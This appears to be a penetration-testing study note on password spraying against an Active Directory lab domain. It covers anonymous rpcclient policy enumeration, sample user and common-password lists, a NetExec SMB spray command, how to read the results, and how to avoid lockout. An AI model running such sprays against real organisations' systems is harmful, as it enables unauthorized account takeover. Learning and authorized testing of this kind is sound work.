### What is Password Spraying?

**Password spraying** = trying **one/few common passwords against many users**.

```text
Brute Force:
1 user → many passwords 

Password Spray:
many users → 1 common password 
```

The goal is to find users who have weak/common passwords while reducing the chance of triggering account lockout.

Common examples:
```text
Summer2026!
Password123!
P@ssw0rd!
CompanyName2026!
```

---

## 1. Enumerate Password Policy

### Tool: `rpcclient`

```bash
rpcclient -U "" <DC_IP> -N
```

Then:
```text
getdompwinfo
```

Useful information:
```text
min_password_length: 12
password_properties: 0x00000001
```

- `min_password_length` → minimum password length
- `DOMAIN_PASSWORD_COMPLEX` → password complexity is enabled

You can also try:
```bash
enum4linux <DC_IP>
```

### Why?

Before spraying, understand the **domain password/lockout policy** so you don't accidentally lock accounts.

---

## 2. Prepare User and Password Lists

Discovered users:
```text
users.txt
```

Example:
```text
administrator
james
svc-admin
backup
robin
darkstar
```

Passwords:
```text
pass.txt
```

Example:
```text
Password1!
Summer2026!
P@ssword123
```

**Important:** A real spray normally uses a **small number of carefully selected passwords**, not a huge password list.

---

# 3. Password Spray with NetExec

### Tool: `NetExec (nxc)`

```bash
nxc smb <DC_IP> \
  -d <DOMAIN> \
  -u users.txt \
  -p pass.txt \
  --continue-on-success
```

Example:
```bash
nxc smb 10.211.11.20 \
  -d spookysec.local \
  -u users.txt \
  -p pass.txt \
  --continue-on-success
```

### Options

|Option|Meaning|
|---|---|
|`smb`|Authenticate through SMB|
|`-d`|Domain|
|`-u`|Username or username file|
|`-p`|Password or password file|
|`--continue-on-success`|Continue testing after finding valid credentials|

---

## 4. Read the Results

### Successful authentication
```text
[+] spookysec.local\james:Password1!
```
**Meaning:** Valid credentials found.

### Invalid password
```text
[-] STATUS_LOGON_FAILURE
```
The credentials are invalid.

### Disabled account
```text
[-] STATUS_ACCOUNT_DISABLED
```
The account exists but is disabled.

### Locked account
```text
[-] STATUS_ACCOUNT_LOCKED_OUT
```
⚠️ **Stop spraying.**

The account is locked, meaning your authentication attempts may be triggering the domain's lockout policy.

### `(Pwn3d!)`
```text
[+] spookysec.local\Administrator:Password123! (Pwn3d!)
```

This indicates that the authenticated account has **administrator-level access on the target machine**.

---

# 5. Password Spraying vs Brute Force

| |Password Spraying|Brute Force|
|---|---|---|
|Target|Many users|Usually one user|
|Passwords|Few common passwords|Many passwords|
|Goal|Find weak accounts|Crack a specific account|
|Lockout risk|Lower|Higher|
|Example|100 users × `Summer2026!`|`james` × 10,000 passwords|

---

# 6. Important Concept

The key idea is:
Reduces the number of consecutive failed attempts against a **single account**, helping avoid account lockout.

